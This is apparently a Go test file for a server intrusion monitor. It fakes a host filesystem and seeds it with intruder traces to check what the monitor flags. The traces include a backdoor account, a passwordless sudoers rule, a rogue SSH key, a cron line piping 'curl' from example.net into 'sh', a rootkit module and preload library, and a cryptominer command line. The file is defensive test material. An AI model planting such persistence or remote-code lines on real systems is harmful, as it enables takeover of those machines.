package health

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"

	"meridian/internal/proto"
)

// Two real public keys and the fingerprints ssh-keygen -l prints for them.
const (
	opsKey   = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPoYxYefxZtwkrNreM9uhU+Kjoqy02D1der/Myfe3CH7 ops@laptop"
	opsFP    = "SHA256:tyYKci233u4kmcF1G4E+i7u2Xg5BIaKT23CbBF/9e6w"
	evilKey  = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG0RIZUeFtXfh28xP3YmSx3ymAkPg1fGyNDCuBGrM0mL evil@box"
	evilFP   = "SHA256:pp75uX1Fr+1hJEZkR/C4S3R5IjIDL8sPE7YvcPEkQJo"
	agentDir = "/var/lib/meridian-agent"
	agentBin = "/usr/local/bin/meridian-agent"
)

// host is a pretend server: a folder with its own proc, etc and var.
type host struct {
	t     *testing.T
	root  string
	clock time.Time
	tcp   []string
	udp   []string
}

func newHost(t *testing.T) *host {
	h := &host{t: t, root: t.TempDir(), clock: time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)}
	h.write("etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"+
		"alice:x:1000:1000:Alice:/home/alice:/bin/bash\n")
	h.write("etc/shadow", "root:$6$salt$hash1:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::\nalice:!:19000:0:99999:7:::\n")
	h.write("etc/sudoers", "root ALL=(ALL:ALL) ALL\n")
	h.write("etc/crontab", "# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
	h.write("etc/ssh/sshd_config", "PermitRootLogin prohibit-password\n")
	h.write("root/.ssh/authorized_keys", opsKey+"\n")
	h.link("etc/systemd/system/multi-user.target.wants/ssh.service", "/lib/systemd/system/ssh.service")
	h.write("proc/modules", "ext4 1 0 - Live 0x0\nnf_tables 1 0 - Live 0x0\n")
	h.write("proc/loadavg", "0.10 0.20 0.30 1/100 1000\n")
	h.write("proc/sys/net/ipv4/ip_local_port_range", "32768\t60999\n")
	h.nic(1<<30, 1<<30)
	h.write("var/log/auth.log", "Oct  9 11:00:00 box sshd[1]: Server listening on 0.0.0.0 port 22.\n")
	// the running agent and its program file, and the cores it installed
	h.write("proc/self/exe", "agent-v1")
	h.write(agentBin[1:], "agent-v1")
	h.write(agentDir[1:]+"/cores/xray/26.3.27/xray", "xray-binary")
	h.write(agentDir[1:]+"/cores/hysteria/2.13.0/hysteria", "hysteria-binary")
	// processes: the init, a kernel thread, sshd on 22, Meridian's Xray on 443, a service that was
	// upgraded (its old file deleted, the new one in place)
	h.proc(1, "systemd", "/usr/lib/systemd/systemd", 0, 0)
	h.proc(2, "kthreadd", "", 0x00200000, 0)
	h.proc(100, "sshd", "/usr/sbin/sshd", 0, 0, 1001)
	h.proc(300, "xray", agentDir+"/cores/xray/26.3.27/xray", 0, 0, 3001)
	h.write("usr/sbin/cron", "new cron")
	h.proc(310, "cron", "/usr/sbin/cron (deleted)", 0, 0)
	h.listen("tcp", "0.0.0.0", 22, 1001)
	h.listen("tcp", "0.0.0.0", 443, 3001)
	h.flush()
	return h
}

func (h *host) path(p string) string { return filepath.Join(h.root, p) }

func (h *host) write(p, content string) {
	h.t.Helper()
	full := h.path(p)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		h.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		h.t.Fatal(err)
	}
}

func (h *host) appendTo(p, content string) {
	h.t.Helper()
	f, err := os.OpenFile(h.path(p), os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		h.t.Fatal(err)
	}
	defer f.Close()
	if _, err := f.WriteString(content); err != nil {
		h.t.Fatal(err)
	}
}

func (h *host) link(p, target string) {
	h.t.Helper()
	full := h.path(p)
	_ = os.MkdirAll(filepath.Dir(full), 0o755)
	_ = os.Remove(full)
	if err := os.Symlink(target, full); err != nil {
		h.t.Fatal(err)
	}
}

// proc makes a process; sockets are the inodes of the sockets it holds.
func (h *host) proc(pid int, comm, exe string, flags, ticks uint64, sockets ...uint64) {
	h.t.Helper()
	d := fmt.Sprintf("proc/%d", pid)
	h.write(d+"/stat", fmt.Sprintf("%d (%s) S 1 1 1 0 -1 %d 0 0 0 0 %d 0 0 0 20 0 1 0 %d 0 0\n", pid, comm, flags, ticks, pid*10))
	h.write(d+"/comm", comm+"\n")
	h.write(d+"/status", "Name:\t"+comm+"\nUid:\t0\t0\t0\t0\n")
	h.write(d+"/cmdline", strings.ReplaceAll(exe, " (deleted)", "")+"\x00")
	if exe != "" {
		h.link(d+"/exe", exe)
	}
	for i, ino := range sockets {
		h.link(fmt.Sprintf("%s/fd/%d", d, i+3), fmt.Sprintf("socket:[%d]", ino))
	}
}

func (h *host) cmdline(pid int, args ...string) {
	h.write(fmt.Sprintf("proc/%d/cmdline", pid), strings.Join(args, "\x00")+"\x00")
}

func (h *host) kill(pid int) {
	_ = os.RemoveAll(h.path(fmt.Sprintf("proc/%d", pid)))
}

func hexAddr(ip string, port int) string {
	a := netip.MustParseAddr(ip)
	b := a.AsSlice()
	for i := 0; i+4 <= len(b); i += 4 {
		b[i], b[i+1], b[i+2], b[i+3] = b[i+3], b[i+2], b[i+1], b[i]
	}
	return fmt.Sprintf("%s:%04X", strings.ToUpper(hex.EncodeToString(b)), port)
}

func (h *host) listen(netw, ip string, port int, inode uint64) {
	state := "0A"
	if netw == "udp" {
		state = "07"
	}
	zero := "0.0.0.0"
	if strings.Contains(ip, ":") {
		zero = "::"
	}
	line := fmt.Sprintf("0: %s %s %s 00000000:00000000 00:00000000 00000000 0 0 %d 1 0", hexAddr(ip, port), hexAddr(zero, 0), state, inode)
	if netw == "udp" {
		h.udp = append(h.udp, line)
	} else {
		h.tcp = append(h.tcp, line)
	}
}

func (h *host) connect(ip string, port int, remote string, rport int, inode uint64) {
	h.tcp = append(h.tcp, fmt.Sprintf("0: %s %s 01 00000000:00000000 00:00000000 00000000 0 0 %d 1 0", hexAddr(ip, port), hexAddr(remote, rport), inode))
}

// flush writes the sockets to /proc/net.
func (h *host) flush() {
	head := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
	var v4, v6 []string
	for _, l := range h.tcp {
		if len(strings.Fields(l)[1]) > 13 {
			v6 = append(v6, l)
		} else {
			v4 = append(v4, l)
		}
	}
	h.write("proc/net/tcp", head+strings.Join(v4, "\n")+"\n")
	h.write("proc/net/tcp6", head+strings.Join(v6, "\n")+"\n")
	h.write("proc/net/udp", head+strings.Join(h.udp, "\n")+"\n")
	h.write("proc/net/udp6", head)
}

func (h *host) nic(rx, tx uint64) {
	h.write("proc/net/dev", "Inter-|   Receive |  Transmit\n face |bytes packets errs drop fifo frame compressed multicast|bytes\n"+
		fmt.Sprintf("    lo: 999 1 0 0 0 0 0 0 999 1 0 0 0 0 0 0\n  eth0: %d 1 0 0 0 0 0 0 %d 1 0 0 0 0 0 0\n", rx, tx))
}

func sum(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func (h *host) monitor(file string) *Monitor {
	return &Monitor{Root: h.root, File: file, Self: "/proc/self/exe", Cores: 2, Now: func() time.Time { return h.clock },
		Own: func() (Own, bool) {
			return Own{Ports: map[string]bool{"tcp:443": true, "tcp:8443": true, "udp:51820": true}, Data: agentDir, Agent: agentBin,
				Digests: map[string]string{"hysteria/2.13.0/hysteria-linux-" + runtime.GOARCH: sum("hysteria-binary"),
					"hysteria/2.14.0/hysteria-linux-" + runtime.GOARCH: sum("the real 2.14")}}, true
		}}
}

// step moves the clock and scans; it returns the findings of the scan by key and delivers them.
func step(t *testing.T, h *host, m *Monitor, d time.Duration) map[string]proto.Finding {
	t.Helper()
	h.clock = h.clock.Add(d)
	m.Scan(context.Background())
	out := map[string]proto.Finding{}
	rep := m.Report()
	if rep != nil {
		for _, f := range rep.Findings {
			if _, dup := out[f.Key]; dup {
				t.Errorf("%s reported twice in one scan", f.Key)
			}
			out[f.Key] = f
		}
	}
	m.Delivered(rep)
	return out
}

func keys(m map[string]proto.Finding) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

// TestBaselineThenChanges: the first scan only records what is normal; what changes after it -
// accounts, passwords, keys, administrator rights, scheduled tasks, services, modules, ports,
// Meridian's programs, sign-ins - is found once each, with the right severity, and nothing that is
// Meridian's or a system service's is.
func TestBaselineThenChanges(t *testing.T) {
	h := newHost(t)
	m := h.monitor(filepath.Join(t.TempDir(), "health.json"))
	if got := step(t, h, m, 0); len(got) != 0 {
		t.Fatalf("the baseline reported findings: %v", keys(got))
	}
	rep := m.Report()
	if rep != nil {
		t.Fatalf("nothing new, but a report: %+v", rep)
	}

	// what an intruder does
	h.appendTo("etc/passwd", "backdoor:x:1001:1001::/home/backdoor:/bin/bash\nsvc:x:998:998::/var/lib/svc:/usr/sbin/nologin\n")
	h.write("etc/shadow", "root:$6$salt$hash2:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::\nalice:$6$x$y:19000:0:99999:7:::\n")
	h.appendTo("root/.ssh/authorized_keys", "command=\"/bin/true\" "+evilKey+"\n")
	h.write("etc/sudoers.d/backdoor", "backdoor ALL=(ALL) NOPASSWD:ALL\n")
	h.appendTo("etc/crontab", "* * * * * root curl -s https://example.net/x | sh\n")
	h.write("var/spool/cron/crontabs/root", "@reboot /tmp/.x/run\n")
	h.link("etc/systemd/system/multi-user.target.wants/evil.service", "/etc/systemd/system/evil.service")
	h.link("etc/systemd/system/multi-user.target.wants/meridian-xray.service", "/etc/systemd/system/meridian-xray.service")
	h.link("etc/systemd/system/multi-user.target.wants/meridian-hy2@22.service", "/etc/systemd/system/meridian-hy2@.service")
	// a look-alike of Meridian's, and a change to what Xray's service runs
	h.link("etc/systemd/system/multi-user.target.wants/meridian-update.service", "/etc/systemd/system/meridian-update.service")
	h.link("etc/systemd/system/multi-user.target.wants/meridian-hy2@7.service", "/opt/.x/run.service")
	h.write("etc/systemd/system/meridian-xray.service.d/override.conf", "[Service]\nExecStartPre=/tmp/.x/run\n")
	h.write("proc/modules", "ext4 1 0 - Live 0x0\nnf_tables 1 0 - Live 0x0\nnf_conntrack 1 0 - Live 0x0\ndiamorphine 1 0 - Live 0x0\n")
	h.proc(400, "backdoor", "/usr/bin/backdoor", 0, 0, 4001)
	h.listen("tcp", "0.0.0.0", 31337, 4001)
	h.listen("tcp", "0.0.0.0", 8443, 3002)   // Meridian's new protocol
	h.listen("udp", "0.0.0.0", 45000, 4002)  // a sending socket
	h.listen("tcp", "127.0.0.1", 9000, 4003) // this server only
	h.listen("udp", "0.0.0.0", 51820, 0)     // WireGuard: the kernel's, Meridian's
	h.listen("tcp", "0.0.0.0", 6000, 0)      // a kernel socket nobody holds
	// the agent's own resolver for WireGuard clients, and a port of Xray's own (server code): Meridian's
	h.proc(200, "meridian-agent", agentBin, 0, 0, 2001, 2002)
	h.listen("udp", "10.66.0.1", 53, 2001)
	h.listen("tcp", "10.66.0.1", 53, 2002)
	h.proc(300, "xray", agentDir+"/cores/xray/26.3.27/xray", 0, 0, 3001, 3002, 3003)
	h.listen("tcp", "0.0.0.0", 10086, 3003)
	h.write(agentDir[1:]+"/cores/xray/26.3.27/xray", "xray-tampered")
	h.write(agentDir[1:]+"/cores/hysteria/2.14.0/hysteria", "not the real 2.14")
	h.appendTo("var/log/auth.log", "Oct  9 12:01:00 box sshd[7]: Accepted publickey for root from 203.0.113.5 port 52314 ssh2: ED25519 "+opsFP+"\n"+
		"Oct  9 12:01:30 box sshd[7]: Accepted publickey for root from 198.51.100.20 port 52315 ssh2: ED25519 "+opsFP+"\n"+
		"Oct  9 12:02:00 box sshd[8]: Accepted password for root from 198.51.100.7 port 4000 ssh2\n"+
		"Oct  9 12:02:30 box sshd[9]: Accepted publickey for alice from ::ffff:203.0.113.6 port 1 ssh2: ED25519 SHA256:def\n"+
		"Oct  9 12:02:40 box sshd[9]: Accepted publickey for alice from ::ffff:203.0.113.6 port 2 ssh2: ED25519 SHA256:def\n"+
		"Oct  9 12:03:00 box sudo: alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls\n")
	h.flush()
	got := step(t, h, m, 5*time.Minute)
	want := map[string]string{
		"account:backdoor":                   proto.SevHigh,
		"account:svc":                        proto.SevWarning,
		"password:root":                      proto.SevHigh,
		"password:alice":                     proto.SevHigh,
		"ssh_keys:root:" + evilFP:            proto.SevHigh,
		"file:/etc/sudoers.d/backdoor":       proto.SevHigh,
		"file:/etc/crontab":                  proto.SevWarning,
		"file:/var/spool/cron/crontabs/root": proto.SevHigh,
		"service:evil.service":               proto.SevWarning,
		"service:meridian-update.service":    proto.SevWarning,
		"service:meridian-hy2@7.service":     proto.SevWarning,
		"file:/etc/systemd/system/meridian-xray.service.d/override.conf": proto.SevWarning,
		"module:diamorphine":             proto.SevWarning,
		"port:tcp:31337":                 proto.SevWarning,
		"port:tcp:6000":                  proto.SevWarning,
		"binary:xray:26.3.27":            proto.SevHigh,
		"binary:hysteria:2.14.0":         proto.SevCritical,
		"ssh-login:root:" + opsFP:        proto.SevInfo,
		"ssh-password:root:198.51.100.7": proto.SevHigh,
		"ssh-login:alice:203.0.113.6":    proto.SevInfo,
	}
	for k, sev := range want {
		f, ok := got[k]
		if !ok {
			t.Errorf("not found: %s", k)
			continue
		}
		if f.Severity != sev {
			t.Errorf("%s: severity %s, want %s", k, f.Severity, sev)
		}
		if f.Title == "" || f.Seq == 0 || f.At != h.clock.Unix() {
			t.Errorf("%s: %+v", k, f)
		}
	}
	for k := range got {
		if _, ok := want[k]; !ok {
			t.Errorf("unexpected finding %s: %s", k, got[k].Title)
		}
	}
	if d := got["ssh_keys:root:"+evilFP].Detail; !strings.Contains(d, evilFP) || !strings.Contains(d, "evil@box") || strings.Contains(d, opsFP) {
		t.Errorf("key detail: %s", d)
	}
	// sign-ins with a key are one finding per key, wherever they come from
	if f := got["ssh-login:root:"+opsFP]; !strings.Contains(f.Title, "203.0.113.5, 198.51.100.20") || !strings.Contains(f.Detail, "2 times") {
		t.Errorf("sign-ins with a key: %+v", f)
	}
	if d := got["file:/etc/crontab"].Detail; !strings.Contains(d, "1 line(s) added") || strings.Contains(d, "curl") {
		t.Errorf("crontab detail (says what changed, never the content): %s", d)
	}
	if d := got["port:tcp:31337"].Detail; !strings.Contains(d, "/usr/bin/backdoor") || !strings.Contains(d, "as root") {
		t.Errorf("port detail: %s", d)
	}
	if d := got["ssh-login:alice:203.0.113.6"].Detail; !strings.Contains(d, "2 times") {
		t.Errorf("two sign-ins are one finding: %s", d)
	}
	if strings.Contains(got["password:root"].Detail, "hash") {
		t.Error("a password finding carries the hash")
	}
	if !got["port:tcp:31337"].Lasting || got["account:backdoor"].Lasting || !got["binary:hysteria:2.14.0"].Lasting {
		t.Error("lasting and one-off findings mixed up")
	}

	// the same state again: events are not repeated, lasting conditions not reported again
	if got := step(t, h, m, 5*time.Minute); len(got) != 0 {
		t.Errorf("reported again: %v", keys(got))
	}
	rep = m.Report()
	if rep != nil {
		t.Errorf("nothing new, but a report: %+v", rep)
	}
	m.Scan(context.Background())
	rep = m.Report()
	if rep == nil || len(rep.Findings) != 0 || !contains(rep.Active, "port:tcp:31337") || contains(rep.Active, "account:backdoor") {
		t.Fatalf("after a quiet scan: %+v", rep)
	}

	// the port closes, then opens again: a new occurrence
	h.tcp = h.tcp[:0]
	h.listen("tcp", "0.0.0.0", 22, 1001)
	h.listen("tcp", "0.0.0.0", 443, 3001)
	h.flush()
	if got := step(t, h, m, 5*time.Minute); len(got) != 0 {
		t.Errorf("a port that closed is a finding: %v", keys(got))
	}
	h.listen("tcp", "0.0.0.0", 31337, 4001)
	h.flush()
	if got := step(t, h, m, 5*time.Minute); got["port:tcp:31337"].Key == "" {
		t.Errorf("a port that opened again is not found: %v", keys(got))
	}
}

func contains(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

// TestBadInThemselves: miners, ld.so.preload, a second uid 0, programs from /tmp, deleted or posing
// as kernel threads, and a connection to a mining pool are found even in the very first scan.
func TestBadInThemselves(t *testing.T) {
	h := newHost(t)
	h.appendTo("etc/passwd", "toor:x:0:0::/root:/bin/sh\n")
	h.write("etc/ld.so.preload", "# rootkit\n/usr/lib/libhide.so\n")
	h.proc(500, "xmrig", "/opt/.x/xmrig", 0, 0, 5001)
	h.cmdline(500, "/opt/.x/xmrig", "-o", "stratum+tcp://pool.example.com:3333", "-u", "WALLET", "-p", "secret-password")
	h.connect("10.0.0.5", 40000, "203.0.113.50", 3333, 5001)
	h.proc(510, "systemd-helper", "/usr/local/bin/helper", 0, 0)
	h.cmdline(510, "/usr/local/bin/helper", "--donate-level=1", "-o", "x:1")
	h.proc(600, "kdev", "/tmp/.x/kdev", 0, 0)
	h.proc(700, "kworker/0:1", "/usr/bin/kw", 0, 0)
	h.proc(800, "gone", "/usr/bin/gone (deleted)", 0, 0)
	h.flush()
	m := h.monitor(filepath.Join(t.TempDir(), "health.json"))
	got := step(t, h, m, 0)
	want := map[string]string{
		"uid0:toor":             proto.SevCritical,
		"preload":               proto.SevCritical,
		"miner:xmrig":           proto.SevCritical,
		"miner:systemd-helper":  proto.SevCritical,
		"pool:xmrig":            proto.SevCritical,
		"tmp:/tmp/.x/kdev":      proto.SevHigh,
		"disguise:/usr/bin/kw":  proto.SevHigh,
		"deleted:/usr/bin/gone": proto.SevHigh,
	}
	for k, sev := range want {
		if f, ok := got[k]; !ok || f.Severity != sev || !f.Lasting {
			t.Errorf("%s: %+v", k, f)
		}
	}
	for k := range got {
		if _, ok := want[k]; !ok {
			t.Errorf("unexpected finding %s", k)
		}
	}
	if d := got["miner:xmrig"].Detail; !strings.Contains(d, "pool.example.com:3333") || strings.Contains(d, "secret-password") || strings.Contains(d, "WALLET") {
		t.Errorf("miner detail (the pool, never the command line): %s", d)
	}
	if d := got["preload"].Detail; !strings.Contains(d, "/usr/lib/libhide.so") || strings.Contains(d, "rootkit") {
		t.Errorf("preload detail: %s", d)
	}
	if d := got["pool:xmrig"].Detail; !strings.Contains(d, "203.0.113.50:3333") {
		t.Errorf("pool detail: %s", d)
	}
	// the miner stops: nothing; it starts again: found again
	h.kill(500)
	h.tcp = nil
	h.flush()
	if got := step(t, h, m, 5*time.Minute); len(got) != 0 {
		t.Errorf("findings when a miner stopped: %v", keys(got))
	}
	if rep := m.Report(); rep != nil {
		t.Errorf("a report without a scan: %+v", rep)
	}
	h.proc(500, "xmrig", "/opt/.x/xmrig", 0, 0)
	if got := step(t, h, m, 5*time.Minute); got["miner:xmrig"].Key == "" {
		t.Errorf("a miner that came back: %v", keys(got))
	}
	// preload changed while it is there: it happened again
	h.write("etc/ld.so.preload", "/usr/lib/libhide2.so\n")
	if got := step(t, h, m, 5*time.Minute); got["preload"].Key == "" || got["preload"].Lasting {
		t.Errorf("a changed preload: %v", got["preload"])
	}
}

// TestBusyPrograms: a program that keeps a core busy for ten minutes is a warning; Meridian's own,
// system services and a short burst are not.
func TestBusyPrograms(t *testing.T) {
	h := newHost(t)
	m := h.monitor(filepath.Join(t.TempDir(), "health.json"))
	h.proc(900, "burner", "/usr/local/bin/burner", 0, 0)
	h.proc(910, "unattended-upgr", "/usr/bin/python3", 0, 0)
	h.proc(920, "short", "/usr/bin/short", 0, 0)
	step(t, h, m, 0)
	// 5 minutes at a full core: 30000 ticks
	h.proc(900, "burner", "/usr/local/bin/burner", 0, 30000)
	h.proc(910, "unattended-upgr", "/usr/bin/python3", 0, 30000)
	h.proc(300, "xray", agentDir+"/cores/xray/26.3.27/xray", 0, 30000, 3001)
	h.proc(920, "short", "/usr/bin/short", 0, 30000)
	if got := step(t, h, m, 5*time.Minute); len(got) != 0 {
		t.Errorf("busy for 5 minutes: %v", keys(got))
	}
	h.proc(900, "burner", "/usr/local/bin/burner", 0, 60000)
	h.proc(910, "unattended-upgr", "/usr/bin/python3", 0, 60000)
	h.proc(300, "xray", agentDir+"/cores/xray/26.3.27/xray", 0, 60000, 3001)
	h.proc(920, "short", "/usr/bin/short", 0, 31000) // calmed down
	got := step(t, h, m, 5*time.Minute)
	if f := got["cpu:burner"]; f.Severity != proto.SevWarning || !strings.Contains(f.Title, "10 minutes") || !strings.Contains(f.Detail, "100%") {
		t.Errorf("busy for 10 minutes: %+v", got)
	}
	if len(got) != 1 {
		t.Errorf("findings: %v", keys(got))
	}
}

// TestSSHBurstAndTraffic: many failed sign-ins in a scan, a load above twice the cores, and far more
// sent than Meridian carried and the server received.
func TestSSHBurstAndTraffic(t *testing.T) {
	h := newHost(t)
	m := h.monitor(filepath.Join(t.TempDir(), "health.json"))
	step(t, h, m, 0)
	var b strings.Builder
	for i := 0; i < 70; i++ {
		// one attempt is two or three lines: counted once
		fmt.Fprintf(&b, "Oct  9 12:0%d:00 box sshd[%d]: Invalid user admin from 192.0.2.%d port %d\n", i%5, i, 1+i%3, 1000+i)
		fmt.Fprintf(&b, "Oct  9 12:0%d:00 box sshd[%d]: Failed password for invalid user admin from 192.0.2.%d port %d ssh2\n", i%5, i, 1+i%3, 1000+i)
		fmt.Fprintf(&b, "Oct  9 12:0%d:01 box sshd[%d]: Connection closed by invalid user admin 192.0.2.%d port %d [preauth]\n", i%5, i, 1+i%3, 1000+i)
	}
	h.appendTo("var/log/auth.log", b.String())
	h.write("proc/loadavg", "9.0 9.0 9.0 1/100 1000\n")
	m.Carried(100 << 20)
	h.nic(1<<30+100<<20, 1<<30+200<<20)
	got := step(t, h, m, 5*time.Minute)
	if f := got["ssh-failed"]; !strings.Contains(f.Detail, "70 failed sign-ins in the last 5 minutes") || !strings.Contains(f.Detail, "from 3 addresses") || !f.Lasting {
		t.Errorf("burst: %+v", f)
	}
	if f := got["load"]; f.Severity != proto.SevWarning || !strings.Contains(f.Detail, "9.0") {
		t.Errorf("load: %+v", f)
	}
	if _, ok := got["traffic"]; ok {
		t.Error("traffic after 5 minutes")
	}
	// ten minutes later: 5 GB more sent, only 100 MB carried and received
	m.Carried(50 << 20)
	h.nic(1<<30+200<<20, 6<<30+200<<20)
	got = step(t, h, m, 5*time.Minute)
	if f := got["traffic"]; f.Severity != proto.SevHigh || !strings.Contains(f.Detail, "sent 5.2 GB") {
		t.Errorf("traffic: %+v (%v)", f, keys(got))
	}
	if _, ok := got["ssh-failed"]; ok {
		t.Error("the burst is reported again while it lasts")
	}
	// after a long gap (the agent was stopped) failures are spread over it: no burst
	h3 := newHost(t)
	m3 := h3.monitor(filepath.Join(t.TempDir(), "health.json"))
	step(t, h3, m3, 0)
	h3.appendTo("var/log/auth.log", b.String())
	if got := step(t, h3, m3, 3*time.Hour); got["ssh-failed"].Key != "" {
		t.Errorf("a burst after a long gap: %+v", got["ssh-failed"])
	}
	// a proxy sends what it receives: no finding
	h2 := newHost(t)
	m2 := h2.monitor(filepath.Join(t.TempDir(), "health.json"))
	step(t, h2, m2, 0)
	step(t, h2, m2, 5*time.Minute)
	h2.nic(9<<30, 9<<30)
	if got := step(t, h2, m2, 5*time.Minute); got["traffic"].Key != "" {
		t.Errorf("a busy proxy flagged: %+v", got["traffic"])
	}
}

// TestAgentReplaced: the agent's program file differing from the running program for two scans is a
// finding; the agent's own upgrade is not.
func TestAgentReplaced(t *testing.T) {
	h := newHost(t)
	m := h.monitor(filepath.Join(t.TempDir(), "health.json"))
	step(t, h, m, 0)
	m.Upgrading(sum("agent-v2"))
	h.write(agentBin[1:], "agent-v2")
	step(t, h, m, 5*time.Minute)
	if got := step(t, h, m, 5*time.Minute); len(got) != 0 {
		t.Errorf("the agent's own upgrade: %v", keys(got))
	}
	h.write(agentBin[1:], "agent-evil")
	if got := step(t, h, m, 5*time.Minute); len(got) != 0 {
		t.Errorf("one scan is not enough: %v", keys(got))
	}
	got := step(t, h, m, 5*time.Minute)
	if f := got["binary:agent"]; f.Severity != proto.SevHigh || !strings.Contains(f.Detail, sum("agent-evil")[:12]) {
		t.Errorf("replaced agent: %+v", got)
	}
	if rep := m.Report(); rep != nil {
		t.Errorf("unexpected report: %+v", rep)
	}
	m.Scan(context.Background())
	if rep := m.Report(); rep == nil || rep.Agent != sum("agent-v1") {
		t.Errorf("the report names the running program: %+v", rep)
	}
}

// TestKeptAcrossRestarts: the baseline, the findings not yet delivered and the lasting ones that hold
// survive an agent restart; a lost report is sent again.
func TestKeptAcrossRestarts(t *testing.T) {
	h := newHost(t)
	file := filepath.Join(t.TempDir(), "health.json")
	m := h.monitor(file)
	step(t, h, m, 0)
	h.proc(600, "kdev", "/tmp/.x/kdev", 0, 0)
	h.appendTo("etc/passwd", "backdoor:x:1001:1001::/home/backdoor:/bin/bash\n")
	h.clock = h.clock.Add(5 * time.Minute)
	m.Scan(context.Background())
	rep := m.Report()
	if rep == nil || len(rep.Findings) != 2 {
		t.Fatalf("report: %+v", rep)
	}
	// the report never arrived; the agent restarts
	m2 := h.monitor(file)
	h.clock = h.clock.Add(5 * time.Minute)
	m2.Scan(context.Background())
	rep2 := m2.Report()
	if rep2 == nil || rep2.ID != rep.ID || len(rep2.Findings) != 2 || rep2.Findings[0].Seq != rep.Findings[0].Seq ||
		!contains(rep2.Active, "tmp:/tmp/.x/kdev") {
		t.Fatalf("after a restart: %+v", rep2)
	}
	m2.Delivered(rep2)
	if r := m2.Report(); r != nil {
		t.Errorf("delivered, yet reported: %+v", r)
	}
	b, _ := os.ReadFile(file)
	if strings.Contains(string(b), "hash1") || strings.Contains(string(b), "$6$") {
		t.Error("the saved baseline holds a password hash")
	}
	if fi, err := os.Stat(file); err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("the baseline file is readable by others: %v", fi.Mode())
	}
}

// TestJournal: with the journal, sign-ins come from journalctl after the cursor it gave last.
func TestJournal(t *testing.T) {
	h := newHost(t)
	m := h.monitor(filepath.Join(t.TempDir(), "health.json"))
	var asked []string
	lines := []string{}
	m.Journal = func(ctx context.Context, cursor string, since time.Time) ([]string, string, error) {
		asked = append(asked, cursor+"@"+fmt.Sprint(since.Unix()))
		out := lines
		lines = nil
		return out, "s=1;i=" + fmt.Sprint(len(asked)), nil
	}
	step(t, h, m, 0)
	lines = []string{"1760011200.000000 box sshd-session[5]: Accepted password for alice from 203.0.113.9 port 2 ssh2"}
	got := step(t, h, m, 5*time.Minute)
	if f := got["ssh-password:alice:203.0.113.9"]; f.Severity != proto.SevWarning {
		t.Errorf("journal sign-in: %v", keys(got))
	}
	if len(asked) != 2 || !strings.HasPrefix(asked[0], "@") || !strings.HasPrefix(asked[1], "s=1;i=1@") {
		t.Errorf("cursors: %v", asked)
	}
}

func TestParseAddr(t *testing.T) {
	for in, want := range map[string]string{
		"0100007F:0016":                         "127.0.0.1:22",
		"00000000:1F90":                         "0.0.0.0:8080",
		"00000000000000000000000001000000:01BB": "[::1]:443",
		"0000000000000000FFFF0000097100CB:0D05": "203.0.113.9:3333",
	} {
		a, ok := parseHexAddr(in)
		if !ok || a.String() != want {
			t.Errorf("%s: %v, want %s", in, a, want)
		}
	}
	if fp, typ, comment, ok := sshKey(opsKey); !ok || fp != opsFP || typ != "ssh-ed25519" || comment != "ops@laptop" {
		t.Errorf("fingerprint: %s %s %s", fp, typ, comment)
	}
	if _, _, _, ok := sshKey("no key here"); ok {
		t.Error("a line without a key")
	}
}

// TestReadSmallFIFO: a FIFO where a file belongs is refused at once, not waited on.
func TestReadSmallFIFO(t *testing.T) {
	p := filepath.Join(t.TempDir(), "authorized_keys")
	if err := syscall.Mkfifo(p, 0o600); err != nil {
		t.Skip(err)
	}
	done := make(chan error, 1)
	go func() {
		_, err := readSmall(p, 1<<20)
		done <- err
	}()
	select {
	case err := <-done:
		if err == nil {
			t.Error("a FIFO was read")
		}
	case <-time.After(3 * time.Second):
		t.Fatal("reading a FIFO blocked")
	}
}
